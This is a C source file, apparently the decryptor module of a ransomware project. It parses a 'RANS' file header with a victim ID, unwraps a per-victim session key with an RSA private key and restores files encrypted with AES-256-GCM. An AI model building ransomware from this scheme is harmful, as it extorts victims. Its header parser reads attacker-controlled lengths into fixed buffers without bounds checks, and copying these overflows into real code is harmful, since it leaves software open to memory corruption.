#include "decrypt.h"
#include "utils.h"

#define MAGIC_LEN 4
#define AES_KEYLEN 32
#define AES_GCM_IVLEN 12
#define AES_GCM_TAGLEN 16
#define VICTIM_ID_LEN 65
#define BUF_SIZE 4096

typedef struct
{
    unsigned char magic[MAGIC_LEN];
    char victimID[VICTIM_ID_LEN];
    uint8_t IVLen;
    unsigned char IV[AES_GCM_IVLEN];
    uint8_t tagLen;
    unsigned char tag[AES_GCM_TAGLEN];
    long ciphertextOffset;
} FileHeader;

int parseHeader(const char *filePath, FileHeader *header)
{
    FILE *fp = fopen(filePath, "rb");
    if (!fp)
        return -1;

    // Read magic bytes
    if (fread(header->magic, 1, MAGIC_LEN, fp) != MAGIC_LEN)
    {
        fclose(fp);
        return -1;
    }

    // check magic bytes
    if (memcmp(header->magic, "RANS", MAGIC_LEN) != 0)
    {
        fclose(fp);
        return -1;
    }

    // Read VICTIMID length and VICTIMID
    uint8_t victimIDLen;
    if (fread(&victimIDLen, 1, 1, fp) != 1)
    {
        fclose(fp);
        return -1;
    }

    if (fread(&header->victimID, 1, victimIDLen, fp) != victimIDLen)
    {
        fclose(fp);
        return -1;
    }
    header->victimID[victimIDLen] = '\0';

    // Read IV length and IV
    if (fread(&header->IVLen, 1, 1, fp) != 1)
    {
        fclose(fp);
        return -1;
    }

    if (fread(header->IV, 1, header->IVLen, fp) != header->IVLen)
    {
        fclose(fp);
        return -1;
    }

    // Read TAG length and TAG
    if (fread(&header->tagLen, 1, 1, fp) != 1)
    {
        fclose(fp);
        return -1;
    }

    if (fread(header->tag, 1, header->tagLen, fp) != header->tagLen)
    {
        fclose(fp);
        return -1;
    }

    header->ciphertextOffset = ftell(fp);

    fclose(fp);
    return 0;
}

int decryptFile(const char *infile, const char *outfile, const unsigned char *sessionKey, const FileHeader *header)
{
    FILE *in = fopen(infile, "rb");
    FILE *out = fopen(outfile, "wb");
    if (!in || !out)
        return 1;

    // Initialize decryption context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        fclose(in);
        fclose(out);
        return 1;
    }

    // Set up algorithm and key/IV
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, header->IVLen, NULL);

    // Initialize key and IV
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, sessionKey, header->IV) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, header->tagLen, (void *)header->tag) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    // Move file pointer to the start of ciphertext
    if (fseek(in, header->ciphertextOffset, SEEK_SET) != 0)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    unsigned char bufferIn[BUF_SIZE];
    unsigned char bufferOut[BUF_SIZE];
    int len, outLen;

    while ((len = fread(bufferIn, 1, BUF_SIZE, in)) > 0)
    {
        if (EVP_DecryptUpdate(ctx, bufferOut, &outLen, bufferIn, len) != 1)
        {
            EVP_CIPHER_CTX_free(ctx);
            fclose(in);
            fclose(out);
            return 1;
        }
        fwrite(bufferOut, 1, outLen, out);
    }

    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, bufferOut, &outLen) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    fwrite(bufferOut, 1, outLen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);

    return 0;
}

void decrypt(const char *filePath)
{

    if (privateKeyPEM == NULL)
    {
        fprintf(stderr, "Private key PEM path is not set.\n");
        return;
    }

    FileHeader header;
    if (parseHeader(filePath, &header) != 0)
    {
        return;
    }

    // Read the wrapped session key from the stored blob
    char wrappedBlob[256] = "/var/tmp/";
    strcat(wrappedBlob, header.victimID);
    wrappedBlob[sizeof(wrappedBlob) - 1] = '\0';
    FILE *file = fopen(wrappedBlob, "rb");

    char b64wrappedkey[512];
    fgets(b64wrappedkey, sizeof(b64wrappedkey), file);
    fclose(file);

    // Base64 decode the wrapped session key
    size_t decodedLen;
    unsigned char *decodedKey = base64Decode(b64wrappedkey, &decodedLen);

    // Load private key from PEM
    EVP_PKEY *priv = loadPrivate(privateKeyPEM);

    // decrypt the session key
    size_t decryptSessionKeyLen;
    unsigned char *decryptedSessionKey = unwrapSessionKey(priv, decodedKey, decodedLen, &decryptSessionKeyLen);

    // Decrypt the file
    char outfile[PATH_MAX];
    strncpy(outfile, filePath, PATH_MAX);
    outfile[PATH_MAX - 1] = '\0';

    char *slash = strrchr(outfile, '.');
    if (slash)
        *slash = '\0';

    if (decryptFile(filePath, outfile, decryptedSessionKey, &header) == 0)
    {
        remove(filePath);
    }

    EVP_PKEY_free(priv);
    OPENSSL_free(decodedKey);
    OPENSSL_free(decryptedSessionKey);
}
